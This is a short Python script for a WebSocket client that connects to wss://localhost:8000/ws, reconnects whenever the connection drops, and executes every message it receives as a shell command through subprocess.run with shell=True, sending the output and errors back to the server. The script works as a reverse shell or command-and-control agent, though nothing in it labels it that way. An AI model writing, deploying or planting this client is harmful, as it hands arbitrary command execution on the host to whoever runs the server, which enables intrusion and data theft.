import asyncio
import websockets
import subprocess
import logging

logging.basicConfig(level=logging.INFO)

class WebSocketClient:
    def __init__(self, uri):
        self.uri = uri

    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.uri, ssl=True) as websocket:  # Use SSL for encrypted communication
                    logging.info("Connected to the server")
                    await self.handle_messages(websocket)
            except websockets.ConnectionClosed:
                logging.error("Connection closed, retrying in 2 seconds...")
                await asyncio.sleep(2)
            except Exception as e:
                logging.error(f"Error: {e}")
                break

    async def handle_messages(self, websocket):
        while True:
            command = await websocket.recv()
            logging.info(f"Received command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            await self.send_response(websocket, result)

    async def send_response(self, websocket, result):
        if result.stdout:
            await websocket.send(f"Output: {result.stdout}")
        if result.stderr:
            await websocket.send(f"Error: {result.stderr}")

    async def run(self):
        await self.connect()

if __name__ == "__main__":
    client = WebSocketClient("wss://localhost:8000/ws")  # Use secure WebSocket connection
    asyncio.run(client.run())
